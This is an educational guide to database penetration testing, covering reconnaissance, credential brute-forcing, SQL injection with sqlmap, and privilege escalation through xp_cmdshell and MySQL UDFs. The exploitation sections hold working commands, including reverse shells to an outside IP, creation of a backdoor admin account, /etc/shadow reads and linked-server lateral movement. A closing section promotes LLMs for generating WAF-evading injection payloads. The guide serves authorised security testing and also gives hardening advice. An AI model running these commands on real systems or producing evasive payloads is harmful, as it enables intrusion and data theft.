Scope, Objectives & Rules of Engagement

Databases are the most valuable targets in any enterprise environment — they hold user credentials, financial records, medical data, intellectual property, and business secrets. Database penetration testing (DB pen testing) is the structured process of assessing a database management system (DBMS) for vulnerabilities, misconfigurations, weak authentication, and exploitable attack surfaces before a real adversary finds them first.

Unlike broad network assessments, database pen testing requires precise scoping. An improperly scoped engagement can cause data loss, outages, or legal liability. Every engagement must begin with a clearly defined scope, documented objectives, and written authorisation before a single tool is run.

[ ⚠ ]

Authorised Environments Only. All techniques in this article are intended for use under explicit, written authorisation from the database or system owner. Unauthorised access to computer systems and databases is a serious criminal offence under the Computer Misuse Act and equivalent legislation worldwide.

01
Scope Definition
Clearly identify which database systems, versions, and schemas are in scope. Distinguish between production and non-production environments — most organisations restrict testing to staging environments to prevent live data exposure or service disruption.
02
Regulatory Compliance
Database pen testing often intersects with compliance frameworks including GDPR, HIPAA, and PCI-DSS. Testing must be conducted in a manner that does not itself cause a reportable data breach — live PII must not be exfiltrated even in a testing context.
03
Rules of Engagement
Document which tests are permitted, testing windows, point-of-contact procedures, and what constitutes an out-of-scope action. Define escalation procedures if critical findings — such as a production database exposed to the internet — are discovered during the engagement.
04
Threat Modelling
Profile the realistic attacker against this database — external unauthenticated attacker, compromised web application, malicious insider, or lateral-moving threat actor. The threat model determines which attack paths to prioritise during the assessment.

Phase I — Reconnaissance & Enumeration

The reconnaissance phase maps the database attack surface — discovering which database services are running, on which ports, which versions, and how they are configured. Version information is critical: outdated databases carry publicly known CVEs with working exploits. Banner grabbing and service fingerprinting are low-noise techniques that reveal high-value intelligence without triggering authentication events.

Phase II — Vulnerability Assessment

Once the database surface is mapped, the assessment moves into active vulnerability testing. This phase identifies weaknesses across three primary dimensions: authentication failures (default or weak credentials), configuration errors (excessive exposure, overprivileged accounts, unencrypted connections), and known software vulnerabilities (unpatched CVEs in the DBMS version identified during recon).

⟩ A — Default & Weak Credential Testing
Many databases are deployed with vendor-supplied default credentials that administrators never change. MySQL installations frequently ship with a passwordless root@localhost account. Microsoft SQL Server retains the sa (System Administrator) account. MongoDB prior to version 4.0 required no authentication at all. Default credential testing is low-noise, high-yield, and should always be the first active test performed.
# Brute-force MySQL credentials with a wordlist hydra -L users.txt -P passwords.txt -t 4 mysql://<TARGET-IP> # Password spray against MSSQL — use --continue-on-success to avoid lockouts hydra -L users.txt -p 'Password123!' mssql://<TARGET-IP> # Test PostgreSQL with default credentials hydra -l postgres -P passwords.txt postgres://<TARGET-IP> # Metasploit — MySQL default credential scanner use auxiliary/scanner/mysql/mysql_login set RHOSTS <TARGET-IP> set USER_FILE users.txt set PASS_FILE passwords.txt run
⟩ B — Misconfiguration Assessment
Misconfigured databases represent one of the most common and impactful attack vectors in real-world breaches. Frequent issues include databases bound to 0.0.0.0 (exposed to all interfaces), authentication bypassed for local connections, excessive privileges granted to application accounts, unencrypted connections between application tiers, and audit logging disabled. A single internet-exposed MongoDB instance without authentication is sufficient for complete data compromise.
# Check which interfaces MySQL is bound to (should NOT be 0.0.0.0) SELECT @@hostname, @@bind_address, @@port; # Enumerate all users and their host restrictions SELECT user, host, authentication_string, plugin FROM mysql.user; # Check for accounts with no password — critical finding SELECT user, host FROM mysql.user WHERE authentication_string = ''; # Check if SSL/TLS is enforced for connections SHOW VARIABLES LIKE '%ssl%'; # Identify users with excessive global privileges SELECT user, host, Super_priv, File_priv, Grant_priv FROM mysql.user WHERE Super_priv='Y' OR File_priv='Y';
# Check if xp_cmdshell is enabled — allows OS command execution SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell'; # List all server-level logins and roles SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S','U','G'); # Check for linked servers — potential lateral movement paths SELECT name, data_source FROM sys.servers WHERE is_linked = 1; # Verify if sa account is enabled (should be disabled) SELECT name, is_disabled FROM sys.server_principals WHERE name = 'sa';

Phase III — SQL Injection Testing

SQL Injection (SQLi) remains one of the most prevalent and damaging vulnerability classes in web applications — ranked consistently in the OWASP Top 10. It occurs when user-supplied input is incorporated into a database query without proper sanitisation, allowing an attacker to modify the query's logic. A successful SQL injection attack against a web application provides direct access to the underlying database — bypassing application-layer authentication entirely.

[ ! ]

SQL injection is responsible for some of the largest data breaches in history — including the 2008 Heartland Payment Systems breach (130 million card records) and numerous healthcare breaches. A single unparameterised query is sufficient to expose an entire database.

SQL Injection Attack Classes

Boolean-Based
Infers data by asking the database true/false questions — responses differ based on whether injected conditions evaluate to TRUE or FALSE
Union-Based
Appends a UNION SELECT to the original query, retrieving data from arbitrary tables and columns in a single response — most efficient for data extraction
Error-Based
Forces database errors that contain query results within their error messages — DBMS-specific, leverages functions like extractvalue() or updatexml()
Time-Based Blind
Infers data by measuring response delay — uses SLEEP() or WAITFOR DELAY to encode boolean answers in time, works even when no output is returned
Out-of-Band
Exfiltrates data via DNS or HTTP requests triggered by the database server itself — used when in-band channels are unavailable or heavily filtered
Stacked Queries
Injects a complete second SQL statement after the original query — enables DML/DDL operations (INSERT, UPDATE, DROP) beyond simple SELECT extraction
# Test for error-based SQLi with a single quote http://target.com/login.php?id=1' # Error response confirms SQLi — message reveals DBMS type # Boolean-based confirmation http://target.com/page.php?id=1 AND 1=1 -- returns normal response http://target.com/page.php?id=1 AND 1=2 -- returns empty/different response # Union-based — find number of columns first http://target.com/page.php?id=1 ORDER BY 1-- http://target.com/page.php?id=1 ORDER BY 2-- http://target.com/page.php?id=1 ORDER BY 3-- # When ORDER BY N causes an error, column count = N-1 # Time-based blind confirmation (MySQL) http://target.com/page.php?id=1 AND SLEEP(5)-- # 5-second delay confirms blind SQLi
# Basic SQLmap scan — detect SQLi and enumerate databases sqlmap -u "http://target.com/login.php?id=1" --dbs # Enumerate tables in a specific database sqlmap -u "http://target.com/page.php?id=1" -D targetdb --tables # Dump specific table contents sqlmap -u "http://target.com/page.php?id=1" -D targetdb -T users --dump # Test POST request — pass the request file from Burp Suite sqlmap -r request.txt --dbs --level=5 --risk=3 # Attempt to gain OS shell if DBMS allows file operations sqlmap -u "http://target.com/page.php?id=1" --os-shell # Bypass WAF with tamper scripts sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,between --dbs

Phase IV — Exploitation

Once access is obtained — whether through credential compromise, SQL injection, or exploitation of a known CVE — the assessment moves into controlled exploitation. The goal is to demonstrate the real-world impact of the vulnerability: exactly what an attacker could access, escalate to, or extract. Every exploitation action must be documented with timestamps, commands run, and output captured for the final report.

⟩ Privilege Escalation via Stored Procedures
Database privilege escalation targets the gap between the privilege level of the initial foothold and the permissions of the underlying database administrator account. In Microsoft SQL Server, the xp_cmdshell stored procedure — if enabled or re-enabled by an account with sysadmin rights — provides direct operating system command execution. In MySQL, abusing FILE and SUPER privileges can achieve similar results.
# Enable xp_cmdshell if currently disabled (requires sysadmin) EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; # Execute OS commands as the SQL Server service account EXEC xp_cmdshell 'whoami'; EXEC xp_cmdshell 'ipconfig /all'; EXEC xp_cmdshell 'net user hacker Password1! /add && net localgroup administrators hacker /add'; # Reverse shell via xp_cmdshell — PowerShell encoded command EXEC xp_cmdshell 'powershell -enc <BASE64_ENCODED_REVSHELL>';
# Check if FILE privilege is available (needed for UDF injection) SHOW GRANTS FOR CURRENT_USER(); # Write a malicious UDF library to the plugin directory SELECT load_file('/tmp/udf.so') INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so'; # Create the malicious function CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so'; # Execute OS commands as the mysql user SELECT sys_exec('id'); SELECT sys_exec('bash -i >& /dev/tcp/10.10.10.1/4444 0>&1');
⟩ Data Extraction & Credential Harvesting
Once elevated access is confirmed, the assessor performs targeted data extraction to demonstrate the true impact of the compromise. The priority targets are credential stores — user tables with passwords, API keys, session tokens — and any high-value data within the engagement scope. All extraction must be strictly limited to what is necessary to demonstrate impact; bulk exfiltration of real production data is not appropriate in a pen testing context.
# Enumerate all databases accessible from current session SHOW DATABASES; SELECT schema_name FROM information_schema.schemata; # List all tables in a target database SELECT table_name FROM information_schema.tables WHERE table_schema = 'targetdb'; # Extract user credentials — the primary proof-of-impact SELECT user, password, email FROM targetdb.users LIMIT 5; # Dump MySQL's own credential store SELECT user, host, authentication_string FROM mysql.user; # Read sensitive files from the OS via MySQL (requires FILE privilege) SELECT load_file('/etc/passwd'); SELECT load_file('/etc/shadow'); -- Requires root-level MySQL
# List all databases \l -- or: SELECT datname FROM pg_database; # List tables in current database \dt -- or: SELECT tablename FROM pg_tables WHERE schemaname='public'; # Extract credentials from application user table SELECT username, password, email FROM users LIMIT 10; # PostgreSQL superuser can copy files — read OS files COPY (SELECT pg_read_file('/etc/passwd')) TO STDOUT;

Phase V — Post-Exploitation & Reporting

Post-exploitation in a database context focuses on lateral movement opportunity — using database credentials to pivot to other services, using OS access gained via the database to move deeper into the network, and assessing the blast radius of the compromise. The engagement closes with a structured report that translates technical findings into business impact, risk ratings, and prioritised remediation steps that the client's team can act on immediately.

# Identify linked servers — databases trusted by the compromised instance SELECT name, data_source, is_linked FROM sys.servers; # Execute queries on a linked server — cross-database lateral movement SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT @@version'); # Execute OS commands on linked server via xp_cmdshell EXECUTE ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER]; # Dump credentials from linked server's master database SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT name, password_hash FROM sys.sql_logins');
Reporting — Minimum Required Findings Documentation
  • 01.Executive Summary — high-level narrative of the engagement outcome written for non-technical stakeholders, including overall risk rating
  • 02.Findings Register — each vulnerability documented with CVSSv3 score, affected systems, evidence (screenshots/command output), and proof-of-concept
  • 03.Attack Chain Narrative — step-by-step walkthrough of how initial access led to the highest-privilege finding, demonstrating realistic attacker behaviour
  • 04.Risk-Prioritised Remediation — specific, actionable remediation guidance for each finding ranked by exploitability and business impact
  • 05.Retesting Scope — define which findings require a follow-up retest after remediation to confirm the fix is effective

Defence — Hardening & Detection

Effective database security is a layered discipline — no single control is sufficient on its own. The mitigations below address the attack paths covered throughout this guide. Implementing them in combination significantly reduces both the likelihood of a successful compromise and the blast radius if one occurs. Defence-in-depth assumes breach and plans accordingly.

Strong Authentication
Eliminate all default credentials immediately post-deployment. Enforce complex passwords with rotation policies. Disable or rename the sa, root, and postgres default accounts where possible. Enable multi-factor authentication for all administrative database access.
Network Segmentation
Database servers must never be directly internet-accessible. Bind database services to internal interfaces only. Implement network-layer firewall rules allowing only application servers on specific ports. Use dedicated database VLANs with strict inter-segment ACLs.
Least Privilege Access
Application database accounts should have only the permissions required for their function — SELECT on specific tables for read-only operations, never superuser or DBA roles. Separate accounts for different application tiers. Audit GRANT statements quarterly.
Parameterised Queries
Eliminate SQL injection at the source by using parameterised statements or prepared statements in all application database interactions. Never concatenate user input into SQL strings. Apply input validation as a secondary control — not a substitute for parameterisation.
Patch Management
Maintain a current, prioritised patching schedule for all DBMS software. Critical CVEs affecting database engines in production should be patched within 48–72 hours. Subscribe to DBMS vendor security advisories and test patches in staging before production deployment.
Encryption at Rest & Transit
Enable TLS/SSL for all database connections — reject unencrypted connections. Apply Transparent Data Encryption (TDE) for data at rest. Ensure database backups are encrypted. Rotate encryption keys on a defined schedule and restrict key access strictly.
Audit & Monitoring
  • Enable database audit logging — log all authentication events, privilege escalation, schema changes, and bulk data reads
  • Deploy a Database Activity Monitor (DAM) for real-time anomaly detection — flag unusual query volumes or off-hours access
  • Integrate database logs with your SIEM — build correlation rules for failed login spikes, repeated privilege escalation attempts
  • Conduct periodic access reviews — revoke stale accounts and over-permissioned roles quarterly
MSSQL Hardening
  • Disable xp_cmdshell, Ole Automation Procedures, and unused features via sp_configure
  • Remove or disable the sa account — use a named account with sysadmin only where essential
  • Audit and remove all linked server trusts that are not actively required
  • Enable SQL Server Audit to write to the Windows Security Event Log for SIEM ingestion
MySQL / PostgreSQL
  • Bind MySQL/PostgreSQL to localhost or specific internal IPs — never 0.0.0.0
  • Revoke FILE, SUPER, and PROCESS privileges from all non-administrative accounts
  • Configure pg_hba.conf to use scram-sha-256 authentication — remove all trust entries
  • Enable pgaudit (PostgreSQL) or MySQL Enterprise Audit for comprehensive query logging

AI Integration in Database Penetration Testing

AI fundamentally accelerates database penetration testing by automating the most tedious analytical phases -- interpreting error messages to identify database type and version, generating targeted SQL injection payloads for specific database engines, analysing stored procedures and schema structures for dangerous patterns, and converting raw database enumeration data into prioritised findings. Modern LLMs understand SQL dialects (MySQL, MSSQL, PostgreSQL, Oracle, SQLite) deeply enough to serve as expert database security advisors for every phase of an assessment.

The most impactful shift: AI can generate context-aware SQL injection payloads tuned to the specific database engine, web framework, and input validation detected during recon -- replacing generic payloads with precisely targeted attacks that evade WAFs and bypass application-level filtering that generic tools miss.

[ AI ]

AI-assisted database assessment workflows reduce manual analysis time by over 60%. Feeding raw error messages, schema dumps, or stored procedure source code directly to Claude or ChatGPT returns targeted exploitation paths, privilege escalation vectors, and remediation guidance faster than any manual analysis -- with coverage across all major database platforms simultaneously.

AI-Powered Offensive DB Capabilities

📈
SQLi Payload Generation
AI generates database-specific, context-aware SQL injection payloads -- UNION-based for MySQL with information_schema, stacked queries for MSSQL with xp_cmdshell, error-based for Oracle with XMLType, and time-based blind payloads tuned to the latency profile of the target. Claude and ChatGPT adapt payloads for the specific WAF bypass requirements observed during testing, generating obfuscated variants that evade signature-based detection without generic tooling limitations.
🔐
Schema & SP Analysis
AI analyses database schema dumps, stored procedure source code, and trigger definitions for dangerous patterns -- dynamic SQL execution with user-controlled input, EXECUTE AS clauses that elevate execution context, OPENROWSET calls to external servers, and linked server configurations that enable lateral movement. Finds privilege escalation paths that automated scanners miss by understanding the semantic meaning of schema relationships, not just surface-level pattern matching.
⚡
Error Message Interpretation
AI interprets verbose database error messages to extract maximum intelligence -- identifying the exact database version, table and column names from failed queries, underlying framework and ORM type, server file system paths from error stack traces, and query structure from syntax errors. Turns a single 500 error page into a complete database fingerprint that informs the entire injection strategy without requiring manual analysis of cryptic error output.
🔎
Privilege Escalation Paths
AI analyses the current database user's roles, permissions, and server configuration to identify privilege escalation chains -- IS_SRVROLEMEMBER checks for MSSQL sysadmin, FILE privilege exploitation in MySQL for UDF loading, COPY TO PROGRAM in PostgreSQL for OS command execution, and Java stored procedures in Oracle. Generates the exact SQL sequence for each escalation path with the specific syntax for the target database engine version.
📄
Automated Report Writing
AI converts raw database assessment evidence -- sqlmap output, manual injection results, credential dumps, schema extracts -- into structured penetration test findings with CVSSv4 scores, CWE identifiers (CWE-89 SQLi, CWE-250 excessive privileges), OWASP Top 10 A03 mapping, database-specific remediation guidance (parameterised queries, stored procedure refactoring, least-privilege account policies), and business impact statements tailored to the data types discovered.
🔭
WAF Bypass Generation
AI generates WAF-evasion variants of SQL injection payloads by understanding both the WAF ruleset characteristics and the target database parser -- case variation, comment injection, URL encoding chains, whitespace substitution, and database-specific parser quirks that cause WAFs and application parsers to interpret the same string differently. Produces a prioritised bypass attempt list tailored to the specific WAF product detected during recon.
